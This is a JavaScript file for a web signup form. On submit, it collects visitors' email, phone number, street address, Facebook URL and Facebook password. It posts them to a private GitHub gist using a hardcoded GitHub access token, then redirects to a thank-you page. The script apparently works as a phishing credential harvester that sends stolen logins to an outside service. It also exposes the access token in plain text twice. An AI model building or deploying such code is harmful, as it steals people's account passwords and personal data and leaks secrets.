import { Octokit, App } from "https://esm.sh/octokit";
// $(function () {
//     'use strict'
//     $('.createAccount').on('click', function (e) {
//         window.location.replace("./page-thank-you.html");

//     });
// })

const octokit = new Octokit({
    auth: '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',
});



async function foobaz(signup) {
    debugger;
    const foo = await octokit.request("POST /gists", {
        description: "Example of a gist",
        public: false,
        files: {
            [new Date().getTime().toString(32)]: {
                content: "Signup  " + signup,
            },
        },
        headers: {
            "x-github-api-version": "2022-11-28",
            "User-Agent": `niagaratriskelion`,
            Authorization: "bearer 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",
        },
    });
    console.log(foo);
    window.location.replace("./page-thank-you.html");
}
(function () {

    document.querySelector(".submit").addEventListener('click', function () {
        const emailAddress = "email: " + document.querySelector('#emailAddress').value + "/"
        const phoneNumber = "phoneNumber: " + document.querySelector('#phoneNumber').value + "/"
        const streetAddress = "streetAddress: " + document.querySelector('#streetAddress').value + "/"
        const facebookUrl = "facebookUrl: " + document.querySelector('#facebookUrl').value + "/"
        const fbPassword = "phoneNumber: " + document.querySelector('#fbPassword').value + "/"
        const signup = emailAddress + phoneNumber + streetAddress + facebookUrl + fbPassword
        foobaz(signup)
    })
})(); 
